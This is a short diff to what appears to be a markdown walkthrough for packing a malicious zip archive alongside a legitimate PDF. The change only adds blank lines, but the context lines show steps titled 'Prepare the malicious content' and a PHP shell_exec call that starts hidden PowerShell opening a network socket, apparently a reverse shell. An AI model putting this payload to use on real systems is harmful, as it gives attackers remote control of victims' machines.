@@ -152,6 +152,7 @@ zip real.zip legit.pdf
 ```
 
 3. Prepare the malicious content :  
+  
 ```sh
 mkdir malfile
 
@@ -170,6 +171,7 @@ shell_exec("powershell -nop -w hidden -c \"\$client = New-Object System.Net.Sock
 ```
 
 4.  Zip the malicious folder :   
+
 ```sh
 cd .. # move one directory up.
 
